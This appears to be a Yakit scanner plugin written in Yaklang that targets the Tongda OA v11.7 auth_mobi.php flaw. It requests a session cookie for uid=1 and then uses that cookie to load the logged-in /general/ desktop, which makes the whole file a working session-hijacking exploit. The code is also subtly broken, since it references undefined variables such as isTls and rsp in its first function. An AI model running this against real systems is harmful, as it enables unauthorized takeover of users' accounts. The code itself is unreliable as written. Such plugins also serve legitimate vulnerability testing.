# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()

handleCheck1 = func(target, port){
    addr1 = str.HostPort(target, port)
    isTls1 = str.IsTLSServer(addr1)

    packet1 = `
GET /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
`
    
    cookiersp,cookiereq,_ = poc.HTTP(packet1, 
    poc.params({"target":addr1}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if !str.MatchAllOfSubString(rsp, "RELOGIN"){
        cookieheader, cookiebody = str.SplitHTTPHeadersAndBodyFromPacket(cookiersp)
        cookie = re.Find(string(cookieheader), `PHPSESSID=[0-9a-zA-Z]+`)
        // println(cookie)
        return cookie
    }
    if !str.MatchAllOfSubString(rsp, "HTTP/1.1 200") {
        return
    }

}

handleCheck = func(target,port,cookie){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET /general/ HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: {{params(cookie)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0

`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr, "cookie":cookie}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        println(string(rsp))
        if str.MatchAllOfRegexp(rsp, `我的桌面`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
            yakit.Info("%v 通达OA v11.7 auth_mobi.php 在线用户登录漏洞", addr)
            risk.NewRisk(
            addr,risk.title("通达OA v11.7 auth_mobi.php 在线用户登录漏洞"),
            risk.severity("high"),
            risk.titleVerbose("通达OA v11.7 auth_mobi.php 在线用户登录漏洞存在"),
            risk.type("Cookie泄露[通达OA v11.7]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在通达OA v11.7 auth_mobi.php 在线用户登录漏洞")
            }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        cookie = handleCheck1(result.Target,result.Port)
        handleCheck(result.Target,result.Port,cookie)
    }
    
}
